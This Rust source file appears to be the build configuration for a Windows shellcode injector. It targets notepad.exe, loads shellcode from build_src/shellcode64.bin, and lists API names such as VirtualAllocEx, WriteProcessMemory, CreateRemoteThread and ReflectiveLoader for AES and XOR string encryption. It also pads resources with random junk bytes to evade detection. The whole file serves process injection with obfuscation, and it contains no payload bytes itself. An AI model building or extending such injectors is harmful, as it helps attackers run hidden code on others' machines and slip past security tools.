const RESOURCE_ID: u32 = 100;
const RESOURCE_NAME: &'static str = "resource.bin";

const TARGET_PROCESS: &'static str = "notepad.exe";
const SHELLCODE_PATH: &'static str = "build_src/shellcode64.bin";

//range for random byte generation. Will generate random amount of junk data between resource entries.
const RANGE_START: usize = 0;
const RANGE_END: usize = 0x100;

static AES_STRINGS: [&str; 18] = [
    "VirtualAlloc",
    "VirtualAllocEx",
    "VirtualProtect",
    "CreateRemoteThread",
    "WaitForSingleObject",
    "WriteProcessMemory",
    "OpenProcess",
    "RtlMoveMemory",
    "CreateToolhelp32Snapshot",
    "Process32First",
    "Process32Next",
    "GetProcAddress",
    "CloseHandle",
    "GetLastError",
    "ReflectiveLoader",
    "MessageBoxA",
    "NtFlushInstructionCache",
    "USER32.dll",
];

static XOR_STRINGS: [&str; 14] = [
    "LoadLibraryA",
    "CryptAcquireContextW",
    "CryptCreateHash",
    "CryptHashData",
    "CryptDeriveKey",
    "CryptDecrypt",
    "CryptReleaseContext",
    "CryptSetKeyParam",
    "CryptGetKeyParam",
    "CryptDestroyHash",
    "CryptDestroyKey",
    "ADVAPI32.dll",
    "KERNEL32.DLL",
    "NTDLL.dll",
    //"NtFlushInstructionCache",
];

// Will try to automate the configs stuff, later. At the moment, doesn't work with 'cargo build'
// Even with switching to windows-rs for build encryption methods, it still doesn't play nice with
// the cfg defines (but only in the build script. Works fine in `src/`
// #[cfg(all(windows, target_pointer_width = "64"))]
// const TARGET_PROCESS: &'static str = "notepad.exe";
// #[cfg(all(windows, target_pointer_width = "32"))]
// const TARGET_PROCESS: &'static str = "cheatengine.exe";

// #[cfg(all(windows, target_pointer_width = "64"))]
// const SHELLCODE_PATH: &'static str = "build_src/shellcode64.bin";
// #[cfg(all(windows, target_pointer_width = "32"))]
// const SHELLCODE_PATH: &'static str = "build_src/shellcode32.bin";
